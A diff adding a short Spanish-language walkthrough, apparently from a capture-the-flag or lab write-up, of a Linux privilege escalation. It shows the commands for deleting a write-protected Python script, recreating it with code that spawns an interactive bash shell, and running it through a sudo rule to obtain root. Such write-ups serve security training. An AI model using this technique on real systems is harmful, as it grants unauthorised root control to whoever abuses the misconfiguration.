@@ -1,0 +1,33 @@
+Vemos que en el directorio hay un archivo python:
+
+
+
+usuario@ubuntu:~$ ls
+archivo.py  texto.txt
+
+
+
+Lo que vamos hacer es borrar el archivo y crear uno con el mismo nombre:
+
+
+
+usuario@ubuntu:~$ rm archivo.py 
+rm: remove write-protected regular file 'archivo.py'? y
+
+
+
+Cuando creamos el archivo nuevo le pegamos esto:
+
+
+
+import os
+os.system("/bin/bash -i")
+
+
+
+Una vez hecho esto ejecutamos lo siguiente y ya tendriamos acceso root:
+
+
+
+sudo /usr/bin/python3 /home/usuario/archivo.py
+
